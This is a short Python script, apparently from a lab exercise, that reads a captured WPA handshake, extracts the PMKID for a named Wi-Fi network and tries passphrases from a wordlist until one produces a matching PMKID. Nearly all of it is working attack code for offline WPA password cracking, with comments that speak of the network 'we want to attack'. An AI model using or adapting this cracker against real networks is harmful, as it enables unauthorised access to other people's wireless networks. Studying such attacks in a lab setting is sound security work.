#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
#from numpy import array_split
#from numpy import array
import hmac, hashlib

wpa=rdpcap("PMKID_handshake.pcap")
ssid=b"Sunrise_2.4GHz_DD4B90"
passPhrase=b"admin123"
"""
i=0

for packet in wpa :
    # The first packet with type, subtype and proto at 0 is an Association Request
    # It contains part of the info we seek (MAC address of AP and STA and ssid)
    # We check if the packet is and Asso Req from the network we want to attack
    i+=1
    if (packet.type == 0x2) and (packet.subtype == 0x8) and (packet.proto == 0x0) and (packet.info == ssid):
        # AP MAC address
        APmac = a2b_hex((packet.addr1).replace(":", ""))
        # STA MAC address
        Clientmac = a2b_hex((packet.addr2).replace(":", ""))
        print(i)
        break
"""
packet = wpa[145]
APmac = a2b_hex((packet.addr2).replace(":", ""))
Clientmac = a2b_hex((packet.addr1).replace(":", ""))
pmkid = raw(packet)[-20:-4]
print("PMKID: ", pmkid)
print("APmac: ", APmac.hex())
print("Clientmac: ", Clientmac.hex())

# We create a list of passphrases from a text file
with open('passphrases.txt') as file :
    for passPhrase in file.readlines() :
        passPhrase = passPhrase.strip()
        #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
        pmk = pbkdf2(hashlib.sha1, passPhrase.encode(), ssid, 4096, 32)

        calc_pmkid = hmac.new(pmk, b"PMK Name" + APmac + Clientmac, hashlib.sha1)
        calc_pmkid = calc_pmkid.digest()[:16]
        print("Passphrase tested : ", passPhrase)
        print("PMKID calculé: ", calc_pmkid)

        if calc_pmkid == pmkid :
            print("Passphrase found : ", passPhrase)
            exit(0)